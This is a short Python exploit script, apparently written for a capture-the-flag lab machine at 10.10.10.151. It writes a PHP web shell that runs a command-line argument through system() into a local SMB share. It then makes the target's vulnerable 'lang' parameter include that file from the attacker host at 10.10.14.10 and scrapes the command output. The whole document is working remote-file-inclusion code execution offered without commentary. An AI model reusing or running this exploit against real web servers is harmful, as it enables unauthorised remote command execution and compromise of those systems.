#!/usr/bin/python
import requests
import sys
import re

cmd = sys.argv[1]
smblpath = '/root/FileServer/'
smbrpath = '\\\\10.10.14.10\\HACK\\'
smbfile = 'sniper.php'
iurl = 'http://10.10.10.151/blog/?lang=' + smbrpath + smbfile

s = open(smblpath + smbfile, 'w')
s.write('<?php\n')
s.write('echo \'AAAA\';\n')
s.write('echo system(\''+cmd+'\');\n')
s.write('echo \'AAAA\';\n')
s.write('?>')
s.close()

res = requests.get(iurl)
out = re.search(r'AAAA(.*)AAAA', res.text, re.DOTALL).group()
print(out)
